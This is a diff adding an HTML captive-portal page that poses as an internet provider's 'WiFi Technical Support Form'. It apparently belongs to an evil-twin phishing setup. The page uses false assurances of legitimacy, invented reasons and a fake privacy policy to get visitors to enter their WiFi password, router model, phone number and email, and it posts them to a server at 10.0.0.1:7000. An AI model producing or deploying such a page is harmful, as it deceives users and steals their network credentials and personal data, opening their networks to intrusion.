@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal</title>
+    <link rel="stylesheet" href="css/form.css">
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;700&display=swap" rel="stylesheet">
+    <script src="js/requeriments.js"></script>
+</head>
+<body>  
+    <form action="http://10.0.0.1:7000/php/serve.php" method="post" class="form">
+        
+        <div class="flex"> <!-- Flex container for images -->
+            <img src="images/signal.png" class="image" alt="WiFi Image">
+            <img src="images/Icon.png" class="image" alt="WiFi Image">
+        </div>
+        <h2 style="text-align: center;">WiFi Technical Support Form</h2>
+        <p>Hello user, you have been redirected to the captive portal of your WiFi network. We apologize for the issues you are experiencing with your wireless network. Unfortunately, these failures can occur randomly on some of the routers we provide as Internet service providers...
+        <br><br>   
+        Please enter the network details, contact information, and the type of problem you are experiencing so that we can assist you and verify the identity of the owner of said wireless network within 10 days.
+        <br><br>
+        <span style="font-weight: bold;">We will only assist you if your issue persists continuously.</span> 
+        <br>
+        <br> If this is not the case, if you have submitted the form and restored the proper functioning of your private network, you need not worry about any further inconvenience, as we will delete this information received from our servers within 120 hours if you request it at the email 
+        shown <span style="font-weight: bold;">in the Privacy Policy section.</span>
+        </p>
+        
+        <div style="width: 100%; background-color: black; height: 3px;"></div>
+        
+        <h3 style="color: rgb(0, 0, 0);">Privacy Policy</h3>    
+        
+        <p>As mentioned earlier, the information submitted will be deleted from our servers within 120 hours if requested. 
+        However, if you need us to delete your data before this period, we ask you to contact us at <a href="mailto:WiFiAssistants2020@proton.me">WiFiAssistants2020@proton.me</a>.
+        <br><br>
+        We request that such urgent requests be justified, as this ensures a fair process for all our 
+        users and prevents potential attempts to improperly delete data. Your understanding is essential to maintaining the effectiveness of our service.
+        <br><br>
+        Data sent to the server is strictly prohibited by company policy from being shared or sold to third parties.
+        </p> 
+
+        <h3 style="color: red;">IMPORTANT!!!</h3>
+        
+        If you have any doubts about the legitimacy of this portal, we assure you that it is a trusted platform. 
+        Data such as your WiFi network password, phone number, and email address are required for the following reasons:
+        <ol>
+            <li>To verify the identity of the customer/device owner who contracted internet services, 
+            <span style="font-weight: bold;">to prevent data falsification related to contracts and the identity of other customers who may have similar devices.</span></li><br>
+            <li>To identify the default password for the specific model of the device, relate it to legitimate manuals and the version of the operating system,
+            <span style="font-weight: bold;">to allow for more accurate maintenance/research of the device.</span><br><br> 
+            <li>For each new contract, <span style="font-weight: bold;">different default passwords and version updates apply 
+                to the system on your network device (Router).</span></li>
+            </li>
+        </ol>
+        <div style="width: 100%; background-color: black; height: 3px;"></div>
+        <fieldset>
+            <legend>Network Information:</legend>
+            <label for="name">WiFi Network Name (SSID):</label><br>
+            <input type="text" id="name" name="name" placeholder="example: Orange_WiFi_123" required><br><br>
+            <label for="password">WiFi Network Password:</label><br>
+            <input type="text" id="passwd" name="passwd" required><br><br>
+            <label for="cipher">WiFi Network Encryption:</label><br>
+            <select id="cipher" name="cipher" required>
+                <option value=""></option>
+                <option value="WPA">WPA</option>
+                <option value="WPA2">WPA2</option>
+                <option value="WPA3">WPA3</option>
+            </select>
+            <br><br>
+            <label for="device">Device Model:</label><br>
+            <input type="text" id="device" name="device" placeholder="example: ZTE ZXHN H168N" required><br><br>
+        </fieldset>
+        <fieldset>
+            <legend>Contact Details:</legend>
+            <label for="telefono">Phone (with code):</label><br>
+            <input type="tel" id="tel" name="tel" placeholder=" +XX-XXXXXXXX" required><br><br>
+            <label for="email">Email Address:</label><br>
+            <input type="email" id="email" name="email" placeholder="client@gmail.com" required><br><br>
+        </fieldset>
+        <fieldset>
+            <legend>Describe the problem you have experienced:</legend>
+            <textarea name="problem" id="problem" style="width: 99%; height: 100px;" required></textarea>
+        </fieldset>
+
+        <fieldset>
+            <legend>Action Buttons:</legend>
+            <input type="submit" value="Submit"><br><br>
+            <input type="reset" value="Clear Form">
+        </fieldset>
+    </form>
+
+    <div id="resultado" style="text-align: center; margin-top: 20px; font-size: 18px;"></div>
+
+        
+</body>
+</html>
